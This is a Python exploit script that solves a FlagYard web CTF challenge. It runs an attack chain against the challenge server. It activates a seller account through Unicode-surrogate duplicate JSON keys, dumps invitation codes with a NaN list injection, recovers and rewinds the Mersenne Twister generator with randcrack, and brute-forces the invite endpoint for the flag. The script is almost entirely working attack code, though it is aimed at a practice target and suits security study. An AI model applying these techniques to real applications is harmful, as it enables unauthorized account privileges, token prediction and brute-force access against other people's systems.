import json, time, sys, os, urllib.request, urllib.error, http.cookiejar

SURROGATE = "\udb88"

# ----------------------------------------------------------------------------
# ANSI colors + pretty output helpers (no external deps)
# ----------------------------------------------------------------------------
class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"

def enable_vt():
    if os.name == "nt":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stdin.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac, width=24):
    filled = int(frac * width)
    block = "\u2588" * filled
    empty = "\u2591" * (width - filled)
    return block + empty

def pct(frac):
    return "[%5.1f%%]" % (frac * 100.0)

def status(frac, msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s %s%s%s" % (C.DIM, pct(frac),
                                C.BOLD + color + icon + (" OK " if icon == "\u2713" else " "),
                                C.RESET, C.BOLD, msg), flush=True)
    if icon in ("\u2713", "\u2717"):
        print()

def ok(frac, msg):
    status(frac, msg, icon="\u2713", color=C.GREEN)

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    print("  \u2551        N O S J   S O L V E R  \u2014  FlagYard Web CTF        \u2551")
    print("  \u2551     Mersenne Twister rewind  |  Unicode truncation      \u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

def boxed(lines, color=C.GREEN):
    w = max(len(l) for l in lines) + 4
    print(color + C.BOLD)
    print("  " + "\u2554" + "\u2550" * (w + 2) + "\u2557")
    for l in lines:
        print("  \u2551  " + l.ljust(w) + "\u2551")
    print("  \u255a" + "\u2550" * (w + 2) + "\u255d")
    print(C.RESET)

def big_flag(flag_text, code, idx, total, elapsed):
    lines = [
        C.YELLOW + "\u2605 " + C.GREEN + " FLAG CAPTURED!" + C.RESET + C.BOLD + "   code=%d   (candidate #%d/%d)" % (code, idx, total),
        C.YELLOW + "\u2605 " + C.WHITE + " elapsed %.1f s" % elapsed,
    ]
    print()
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for l in lines:
        print("  \u2551  " + l.ljust(56) + "\u2551")
    print("  \u2551" + " " * 58 + "\u2551")
    flag = flag_text.splitlines()[0].strip()
    print("  \u2551  " + C.GREEN + C.BOLD + (" " * 4) + flag + C.RESET + C.MAGENTA + C.BOLD + " " * max(0, 56 - len(flag) - 4) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET + "\n")

# ----------------------------------------------------------------------------
# HTTP client with cookie jar + retries
# ----------------------------------------------------------------------------
class Client:
    def __init__(self, base):
        self.base = base.rstrip("/")
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
        self._last = ""

    def post(self, path, obj=None, raw=None):
        data = raw if raw is not None else json.dumps(obj).encode()
        req = urllib.request.Request(self.base + path, data=data, method="POST")
        req.add_header("Content-Type", "application/json")
        for attempt in range(8):
            try:
                with self.opener.open(req, timeout=30) as r:
                    self._last = r.read().decode()
                    return r.status, self._last
            except urllib.error.HTTPError as e:
                self._last = e.read().decode()
                return e.code, self._last
            except Exception as ex:
                if attempt == 7:
                    return -1, str(ex)
                time.sleep(2)
        return -1, "fail"


def main():
    enable_vt()
    banner()

    base = input("  Challenge URL > ").strip()
    if not base:
        base = "http://k725e76b27717474b73976e5483536571.playat.flagyard.com"
    header = "  " + C.GRAY + "target : " + C.CYAN + base + C.RESET
    print(header)
    print()
    client = Client(base)
    t0 = time.time()

    # ---- step 1: activated seller via Unicode-truncation duplicate keys
    status(0.05, "Registering activated seller (unicode-truncation trick)...")
    user = "wolf%d" % int(time.time() * 1000)
    key2 = "activated" + SURROGATE
    s, b = client.post("/register/seller", {"username": user, "password": "p@ss123", "bio": "x",
                                            "activated": False, key2: True})
    if s != 200:
        fail("register seller failed: %s %s" % (s, b[:160])); return
    s, b = client.post("/login/seller", {"username": user, "password": "p@ss123"})
    if s != 200:
        fail("login seller failed: %s %s" % (s, b[:160])); return
    ok(0.22, "Seller activated \u2014 dashboard access granted.")

    # ---- step 2: dump 800 codes via [NaN,...] list
    status(0.30, "Dumping 800 invitation codes (NaN list injection)...")
    raw = ('{"name": [%s]}' % ",".join(["NaN"] * 800)).encode()
    s, b = client.post("/get_buyer_invitation", raw=raw)
    if s != 200:
        fail("dump failed: %s %s" % (s, b[:160])); return
    obj = json.loads(b)
    obs = []
    for v in obj.values():
        if isinstance(v, list):
            obs.extend(int(c) for c in v if isinstance(c, int) or str(c).isdigit())
    if len(obs) < 624:
        fail("not enough codes dumped: %d" % len(obs)); return
    ok(0.42, "Got %d sequential 32-bit codes." % len(obs))

    # ---- step 3: MT19937 recovery + rewind
    status(0.50, "Recovering MT19937 internal state...")
    from randcrack import RandCrack
    rcf = RandCrack()
    for c in obs[:624]:
        rcf.submit(c)
    m = sum(1 for i in range(len(obs) - 624) if rcf.predict_getrandbits(32) == obs[624 + i])
    if m != len(obs) - 624:
        fail("MT19937 forward check FAILED (%d/%d) \u2014 stream is not plain getrandbits" % (m, len(obs) - 624)); return
    ok(0.62, "MT19937 confirmed \u2014 forward predictions match 100%% (%d/%d)." % (m, len(obs) - 624))

    rc = RandCrack()
    for c in obs[:624]:
        rc.submit(c)
    rc.offset(-(624 + 800))
    prev = [rc.predict_getrandbits(32) for _ in range(800)]
    candidates = prev + obs
    ok(0.70, "PRNG rewound \u2014 %d previous + %d dumped = %d candidates." % (len(prev), len(obs), len(candidates)))

    # ---- step 4: buyer account
    status(0.72, "Registering buyer account...")
    buyer = "bx%d" % int(time.time() * 1000)
    s, b = client.post("/register/buyer", {"username": buyer, "password": "p@ss123"})
    if s != 200:
        fail("register buyer failed: %s %s" % (s, b[:160])); return
    s, b = client.post("/login/buyer", {"username": buyer, "password": "p@ss123"})
    if s != 200:
        fail("login buyer failed: %s %s" % (s, b[:160])); return
    ok(0.75, "Buyer account ready.")

    # ---- step 5: brute force
    total = len(candidates)
    print("  " + C.BOLD + "Brute-forcing invitation codes..." + C.RESET + "\n")
    start = 0.75
    for i, code in enumerate(candidates, 1):
        s, b = client.post("/buyer/invite", {"invitation": "%d" % code})
        if s == -1:
            s, b = client.post("/buyer/invite", {"invitation": "%d" % code})
        frac = start + (1.0 - start) * (i / total)
        if s == 200 or (s != 400 and "Invalid" not in b):
            flag = b.strip().splitlines()[0]
            big_flag(flag, code, i, total, time.time() - t0)
            return
        line = ("  %s%s %5.1f%%%s %s %3d/%d  code=%-11d" %
                (C.CYAN, bar(frac, 20), frac * 100.0, C.DIM, C.GREEN, i, total, code))
        sys.stdout.write("\r" + line + C.RESET)
        sys.stdout.flush()
    print("\n\n  %s\u2717 No valid code in this window \u2014 restart the instance and re-run.%s" % (C.RED, C.RESET))


if __name__ == "__main__":
    main()